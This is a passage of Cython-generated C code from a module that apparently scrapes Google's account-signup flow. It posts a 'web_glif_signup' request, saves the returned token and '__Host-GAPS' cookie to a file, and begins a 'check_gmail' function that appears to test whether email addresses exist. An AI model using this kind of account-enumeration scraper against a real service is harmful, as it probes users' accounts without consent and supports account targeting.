      PyTuple_SET_ITEM(__pyx_t_7, 1, __pyx_t_4);
      __pyx_t_4 = 0;
      __Pyx_INCREF(__pyx_kp_u__25);
      __pyx_t_11 += 3;
      __Pyx_GIVEREF(__pyx_kp_u__25);
      PyTuple_SET_ITEM(__pyx_t_7, 2, __pyx_kp_u__25);
      __pyx_t_4 = __Pyx_PyUnicode_Unicode(__pyx_v_n1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 434, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_12 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_12) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_12;
      __pyx_t_11 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
      __Pyx_GIVEREF(__pyx_t_4);
      PyTuple_SET_ITEM(__pyx_t_7, 3, __pyx_t_4);
      __pyx_t_4 = 0;
      __Pyx_INCREF(__pyx_kp_u__25);
      __pyx_t_11 += 3;
      __Pyx_GIVEREF(__pyx_kp_u__25);
      PyTuple_SET_ITEM(__pyx_t_7, 4, __pyx_kp_u__25);
      __pyx_t_4 = __Pyx_PyUnicode_Unicode(__pyx_v_n2); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 434, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_12 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_12) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_12;
      __pyx_t_11 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
      __Pyx_GIVEREF(__pyx_t_4);
      PyTuple_SET_ITEM(__pyx_t_7, 5, __pyx_t_4);
      __pyx_t_4 = 0;
      __Pyx_INCREF(__pyx_kp_u__25);
      __pyx_t_11 += 3;
      __Pyx_GIVEREF(__pyx_kp_u__25);
      PyTuple_SET_ITEM(__pyx_t_7, 6, __pyx_kp_u__25);
      __pyx_t_4 = __Pyx_PyUnicode_Unicode(__pyx_v_n1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 434, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_12 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_12) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_12;
      __pyx_t_11 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
      __Pyx_GIVEREF(__pyx_t_4);
      PyTuple_SET_ITEM(__pyx_t_7, 7, __pyx_t_4);
      __pyx_t_4 = 0;
      __Pyx_INCREF(__pyx_kp_u__25);
      __pyx_t_11 += 3;
      __Pyx_GIVEREF(__pyx_kp_u__25);
      PyTuple_SET_ITEM(__pyx_t_7, 8, __pyx_kp_u__25);
      __pyx_t_4 = __Pyx_PyUnicode_Unicode(__pyx_v_n2); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 434, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_12 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_12) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_12;
      __pyx_t_11 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
      __Pyx_GIVEREF(__pyx_t_4);
      PyTuple_SET_ITEM(__pyx_t_7, 9, __pyx_t_4);
      __pyx_t_4 = 0;
      __Pyx_INCREF(__pyx_kp_u_0_0_null_null_web_glif_signup_0);
      __pyx_t_11 += 48;
      __Pyx_GIVEREF(__pyx_kp_u_0_0_null_null_web_glif_signup_0);
      PyTuple_SET_ITEM(__pyx_t_7, 10, __pyx_kp_u_0_0_null_null_web_glif_signup_0);
      __pyx_t_4 = __Pyx_PyUnicode_Join(__pyx_t_7, 11, __pyx_t_11, __pyx_t_12); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 434, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      if (PyDict_SetItem(__pyx_t_5, __pyx_kp_u_f_req, __pyx_t_4) < 0) __PYX_ERR(0, 434, __pyx_L3_error)
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      if (PyDict_SetItem(__pyx_t_5, __pyx_n_u_deviceinfo, __pyx_kp_u_null_null_null_null_null_NL_nul) < 0) __PYX_ERR(0, 434, __pyx_L3_error)
      __pyx_v_data = ((PyObject*)__pyx_t_5);
      __pyx_t_5 = 0;

      
      __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_requests); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 437, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_post); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 437, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

      
      __pyx_t_5 = __Pyx_PyDict_NewPresized(3); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 439, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_cookies, __pyx_v_cookies) < 0) __PYX_ERR(0, 439, __pyx_L3_error)

      
      if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_headers, __pyx_v_headers) < 0) __PYX_ERR(0, 439, __pyx_L3_error)

      
      if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_data, __pyx_v_data) < 0) __PYX_ERR(0, 439, __pyx_L3_error)

      
      __pyx_t_7 = __Pyx_PyObject_Call(__pyx_t_4, __pyx_tuple__26, __pyx_t_5); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 437, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_v_response = __pyx_t_7;
      __pyx_t_7 = 0;

      
      __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_v_response, __pyx_n_s_text); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 443, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __pyx_t_4 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyUnicode_Type)), __pyx_t_5); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 443, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_t_5 = PyUnicode_Split(((PyObject*)__pyx_t_4), __pyx_kp_u_null, -1L); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 443, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_t_4 = __Pyx_GetItemInt_List(__pyx_t_5, 1, long, 1, __Pyx_PyInt_From_long, 1, 0, 1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 443, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_split); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 443, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_t_4 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_5))) {
        __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_5);
        if (likely(__pyx_t_4)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
          __Pyx_INCREF(__pyx_t_4);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_5, function);
        }
      }
      __pyx_t_7 = (__pyx_t_4) ? __Pyx_PyObject_Call2Args(__pyx_t_5, __pyx_t_4, __pyx_kp_u__27) : __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_kp_u__27);
      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
      if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 443, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_t_5 = __Pyx_GetItemInt(__pyx_t_7, 0, long, 1, __Pyx_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 443, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __pyx_v_tl = __pyx_t_5;
      __pyx_t_5 = 0;

      
      __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_v_response, __pyx_n_s_cookies); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 444, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_7);
      __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_get_dict); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 444, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __pyx_t_7 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_4))) {
        __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_4);
        if (likely(__pyx_t_7)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
          __Pyx_INCREF(__pyx_t_7);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_4, function);
        }
      }
      __pyx_t_5 = (__pyx_t_7) ? __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_7) : __Pyx_PyObject_CallNoArg(__pyx_t_4);
      __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
      if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 444, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_t_5, __pyx_kp_u_Host_GAPS); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 444, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __Pyx_DECREF_SET(__pyx_v_host, __pyx_t_4);
      __pyx_t_4 = 0;

      
      /*with:*/ {
        __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__28, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 445, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_13 = __Pyx_PyObject_LookupSpecial(__pyx_t_4, __pyx_n_s_exit_2); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 445, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_13);
        __pyx_t_7 = __Pyx_PyObject_LookupSpecial(__pyx_t_4, __pyx_n_s_enter); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 445, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_7);
        __pyx_t_10 = NULL;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_7))) {
          __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_7);
          if (likely(__pyx_t_10)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
            __Pyx_INCREF(__pyx_t_10);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_7, function);
          }
        }
        __pyx_t_5 = (__pyx_t_10) ? __Pyx_PyObject_CallOneArg(__pyx_t_7, __pyx_t_10) : __Pyx_PyObject_CallNoArg(__pyx_t_7);
        __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
        if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 445, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        __pyx_t_7 = __pyx_t_5;
        __pyx_t_5 = 0;
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        /*try:*/ {
          {
            __Pyx_PyThreadState_declare
            __Pyx_PyThreadState_assign
            __Pyx_ExceptionSave(&__pyx_t_14, &__pyx_t_15, &__pyx_t_16);
            __Pyx_XGOTREF(__pyx_t_14);
            __Pyx_XGOTREF(__pyx_t_15);
            __Pyx_XGOTREF(__pyx_t_16);
            /*try:*/ {
              __pyx_v_f = __pyx_t_7;
              __pyx_t_7 = 0;

              
              __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_f, __pyx_n_s_write); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 446, __pyx_L13_error)
              __Pyx_GOTREF(__pyx_t_4);
              __pyx_t_5 = PyTuple_New(4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 446, __pyx_L13_error)
              __Pyx_GOTREF(__pyx_t_5);
              __pyx_t_11 = 0;
              __pyx_t_12 = 127;
              __pyx_t_10 = __Pyx_PyObject_FormatSimple(__pyx_v_tl, __pyx_empty_unicode); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 446, __pyx_L13_error)
              __Pyx_GOTREF(__pyx_t_10);
              __pyx_t_12 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_10) > __pyx_t_12) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_10) : __pyx_t_12;
              __pyx_t_11 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_10);
              __Pyx_GIVEREF(__pyx_t_10);
              PyTuple_SET_ITEM(__pyx_t_5, 0, __pyx_t_10);
              __pyx_t_10 = 0;
              __Pyx_INCREF(__pyx_kp_u__29);
              __pyx_t_11 += 2;
              __Pyx_GIVEREF(__pyx_kp_u__29);
              PyTuple_SET_ITEM(__pyx_t_5, 1, __pyx_kp_u__29);
              __pyx_t_10 = __Pyx_PyObject_FormatSimple(__pyx_v_host, __pyx_empty_unicode); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 446, __pyx_L13_error)
              __Pyx_GOTREF(__pyx_t_10);
              __pyx_t_12 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_10) > __pyx_t_12) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_10) : __pyx_t_12;
              __pyx_t_11 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_10);
              __Pyx_GIVEREF(__pyx_t_10);
              PyTuple_SET_ITEM(__pyx_t_5, 2, __pyx_t_10);
              __pyx_t_10 = 0;
              __Pyx_INCREF(__pyx_kp_u_);
              __pyx_t_11 += 1;
              __Pyx_GIVEREF(__pyx_kp_u_);
              PyTuple_SET_ITEM(__pyx_t_5, 3, __pyx_kp_u_);
              __pyx_t_10 = __Pyx_PyUnicode_Join(__pyx_t_5, 4, __pyx_t_11, __pyx_t_12); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 446, __pyx_L13_error)
              __Pyx_GOTREF(__pyx_t_10);
              __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
              __pyx_t_5 = NULL;
              if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_4))) {
                __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_4);
                if (likely(__pyx_t_5)) {
                  PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
                  __Pyx_INCREF(__pyx_t_5);
                  __Pyx_INCREF(function);
                  __Pyx_DECREF_SET(__pyx_t_4, function);
                }
              }
              __pyx_t_7 = (__pyx_t_5) ? __Pyx_PyObject_Call2Args(__pyx_t_4, __pyx_t_5, __pyx_t_10) : __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_10);
              __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
              __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
              if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 446, __pyx_L13_error)
              __Pyx_GOTREF(__pyx_t_7);
              __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
              __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

              
            }
            __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
            __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;
            __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
            goto __pyx_L18_try_end;
            __pyx_L13_error:;
            __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
            __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
            __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
            __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
            __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
            __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
            /*except:*/ {
              __Pyx_AddTraceback("source.tll", __pyx_clineno, __pyx_lineno, __pyx_filename);
              if (__Pyx_GetException(&__pyx_t_7, &__pyx_t_4, &__pyx_t_10) < 0) __PYX_ERR(0, 445, __pyx_L15_except_error)
              __Pyx_GOTREF(__pyx_t_7);
              __Pyx_GOTREF(__pyx_t_4);
              __Pyx_GOTREF(__pyx_t_10);
              __pyx_t_5 = PyTuple_Pack(3, __pyx_t_7, __pyx_t_4, __pyx_t_10); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 445, __pyx_L15_except_error)
              __Pyx_GOTREF(__pyx_t_5);
              __pyx_t_17 = __Pyx_PyObject_Call(__pyx_t_13, __pyx_t_5, NULL);
              __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
              __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
              if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 445, __pyx_L15_except_error)
              __Pyx_GOTREF(__pyx_t_17);
              __pyx_t_18 = __Pyx_PyObject_IsTrue(__pyx_t_17);
              __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
              if (__pyx_t_18 < 0) __PYX_ERR(0, 445, __pyx_L15_except_error)
              __pyx_t_19 = ((!(__pyx_t_18 != 0)) != 0);
              if (__pyx_t_19) {
                __Pyx_GIVEREF(__pyx_t_7);
                __Pyx_GIVEREF(__pyx_t_4);
                __Pyx_XGIVEREF(__pyx_t_10);
                __Pyx_ErrRestoreWithState(__pyx_t_7, __pyx_t_4, __pyx_t_10);
                __pyx_t_7 = 0; __pyx_t_4 = 0; __pyx_t_10 = 0; 
                __PYX_ERR(0, 445, __pyx_L15_except_error)
              }
              __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
              __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
              __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
              goto __pyx_L14_exception_handled;
            }
            __pyx_L15_except_error:;
            __Pyx_XGIVEREF(__pyx_t_14);
            __Pyx_XGIVEREF(__pyx_t_15);
            __Pyx_XGIVEREF(__pyx_t_16);
            __Pyx_ExceptionReset(__pyx_t_14, __pyx_t_15, __pyx_t_16);
            goto __pyx_L3_error;
            __pyx_L14_exception_handled:;
            __Pyx_XGIVEREF(__pyx_t_14);
            __Pyx_XGIVEREF(__pyx_t_15);
            __Pyx_XGIVEREF(__pyx_t_16);
            __Pyx_ExceptionReset(__pyx_t_14, __pyx_t_15, __pyx_t_16);
            __pyx_L18_try_end:;
          }
        }
        /*finally:*/ {
          /*normal exit:*/{
            if (__pyx_t_13) {
              __pyx_t_16 = __Pyx_PyObject_Call(__pyx_t_13, __pyx_tuple__30, NULL);
              __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
              if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 445, __pyx_L3_error)
              __Pyx_GOTREF(__pyx_t_16);
              __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
            }
            goto __pyx_L12;
          }
          __pyx_L12:;
        }
        goto __pyx_L22;
        __pyx_L9_error:;
        __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
        goto __pyx_L3_error;
        __pyx_L22:;
      }

      
    }
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    goto __pyx_L8_try_end;
    __pyx_L3_error:;
    __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;

    
    __pyx_t_9 = __Pyx_PyErr_ExceptionMatches(((PyObject *)(&((PyTypeObject*)PyExc_Exception)[0])));
    if (__pyx_t_9) {
      __Pyx_AddTraceback("source.tll", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_10, &__pyx_t_4, &__pyx_t_7) < 0) __PYX_ERR(0, 447, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_INCREF(__pyx_t_4);
      __pyx_v_e = __pyx_t_4;
      /*try:*/ {

        
        __pyx_t_5 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_v_e); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 448, __pyx_L28_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

        
        __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_tll); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 449, __pyx_L28_error)
        __Pyx_GOTREF(__pyx_t_6);
        __pyx_t_8 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_6))) {
          __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_6);
          if (likely(__pyx_t_8)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
            __Pyx_INCREF(__pyx_t_8);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_6, function);
          }
        }
        __pyx_t_5 = (__pyx_t_8) ? __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_t_8) : __Pyx_PyObject_CallNoArg(__pyx_t_6);
        __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
        if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 449, __pyx_L28_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      }

      
      /*finally:*/ {
        /*normal exit:*/{
          __Pyx_DECREF(__pyx_v_e);
          __pyx_v_e = NULL;
          goto __pyx_L29;
        }
        __pyx_L28_error:;
        /*exception exit:*/{
          __Pyx_PyThreadState_declare
          __Pyx_PyThreadState_assign
          __pyx_t_13 = 0; __pyx_t_16 = 0; __pyx_t_15 = 0; __pyx_t_14 = 0; __pyx_t_17 = 0; __pyx_t_22 = 0;
          __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
          __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
          __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
          if (PY_MAJOR_VERSION >= 3) __Pyx_ExceptionSwap(&__pyx_t_14, &__pyx_t_17, &__pyx_t_22);
          if ((PY_MAJOR_VERSION < 3) || unlikely(__Pyx_GetException(&__pyx_t_13, &__pyx_t_16, &__pyx_t_15) < 0)) __Pyx_ErrFetch(&__pyx_t_13, &__pyx_t_16, &__pyx_t_15);
          __Pyx_XGOTREF(__pyx_t_13);
          __Pyx_XGOTREF(__pyx_t_16);
          __Pyx_XGOTREF(__pyx_t_15);
          __Pyx_XGOTREF(__pyx_t_14);
          __Pyx_XGOTREF(__pyx_t_17);
          __Pyx_XGOTREF(__pyx_t_22);
          __pyx_t_9 = __pyx_lineno; __pyx_t_20 = __pyx_clineno; __pyx_t_21 = __pyx_filename;
          {
            __Pyx_DECREF(__pyx_v_e);
            __pyx_v_e = NULL;
          }
          if (PY_MAJOR_VERSION >= 3) {
            __Pyx_XGIVEREF(__pyx_t_14);
            __Pyx_XGIVEREF(__pyx_t_17);
            __Pyx_XGIVEREF(__pyx_t_22);
            __Pyx_ExceptionReset(__pyx_t_14, __pyx_t_17, __pyx_t_22);
          }
          __Pyx_XGIVEREF(__pyx_t_13);
          __Pyx_XGIVEREF(__pyx_t_16);
          __Pyx_XGIVEREF(__pyx_t_15);
          __Pyx_ErrRestore(__pyx_t_13, __pyx_t_16, __pyx_t_15);
          __pyx_t_13 = 0; __pyx_t_16 = 0; __pyx_t_15 = 0; __pyx_t_14 = 0; __pyx_t_17 = 0; __pyx_t_22 = 0;
          __pyx_lineno = __pyx_t_9; __pyx_clineno = __pyx_t_20; __pyx_filename = __pyx_t_21;
          goto __pyx_L5_except_error;
        }
        __pyx_L29:;
      }
      __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
      __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
      goto __pyx_L4_exception_handled;
    }
    goto __pyx_L5_except_error;
    __pyx_L5_except_error:;

    
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    goto __pyx_L1_error;
    __pyx_L4_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    __pyx_L8_try_end:;
  }

  

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_XDECREF(__pyx_t_7);
  __Pyx_XDECREF(__pyx_t_8);
  __Pyx_XDECREF(__pyx_t_10);
  __Pyx_AddTraceback("source.tll", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_n1);
  __Pyx_XDECREF(__pyx_v_n2);
  __Pyx_XDECREF(__pyx_v_host);
  __Pyx_XDECREF(__pyx_v_he3);
  __Pyx_XDECREF(__pyx_v_res1);
  __Pyx_XDECREF(__pyx_v_tok);
  __Pyx_XDECREF(__pyx_v_cookies);
  __Pyx_XDECREF(__pyx_v_headers);
  __Pyx_XDECREF(__pyx_v_data);
  __Pyx_XDECREF(__pyx_v_response);
  __Pyx_XDECREF(__pyx_v_tl);
  __Pyx_XDECREF(__pyx_v_f);
  __Pyx_XDECREF(__pyx_v_e);
  __Pyx_XDECREF(__pyx_gb_6source_3tll_2generator);
  __Pyx_XDECREF(__pyx_gb_6source_3tll_5generator1);
  __Pyx_XDECREF(__pyx_gb_6source_3tll_8generator2);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}



/* Python wrapper */
static PyObject *__pyx_pw_6source_13check_gmail(PyObject *__pyx_self, PyObject *__pyx_v_email); /*proto*/
static PyMethodDef __pyx_mdef_6source_13check_gmail = {"check_gmail", (PyCFunction)__pyx_pw_6source_13check_gmail, METH_O, 0};
static PyObject *__pyx_pw_6source_13check_gmail(PyObject *__pyx_self, PyObject *__pyx_v_email) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("check_gmail (wrapper)", 0);
  __pyx_r = __pyx_pf_6source_12check_gmail(__pyx_self, ((PyObject *)__pyx_v_email));

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_6source_12check_gmail(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_email) {
  PyObject *__pyx_v_o = NULL;
  PyObject *__pyx_v_tl = NULL;
  PyObject *__pyx_v_host = NULL;
  PyObject *__pyx_v_cookies = NULL;
  PyObject *__pyx_v_headers = NULL;
  PyObject *__pyx_v_params = NULL;
  PyObject *__pyx_v_data = NULL;
  PyObject *__pyx_v_response = NULL;
  PyObject *__pyx_v_ok = NULL;
  PyObject *__pyx_v_username = NULL;
  PyObject *__pyx_v_gg = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  int __pyx_t_4;
  int __pyx_t_5;
  PyObject *__pyx_t_6 = NULL;
  PyObject *__pyx_t_7 = NULL;
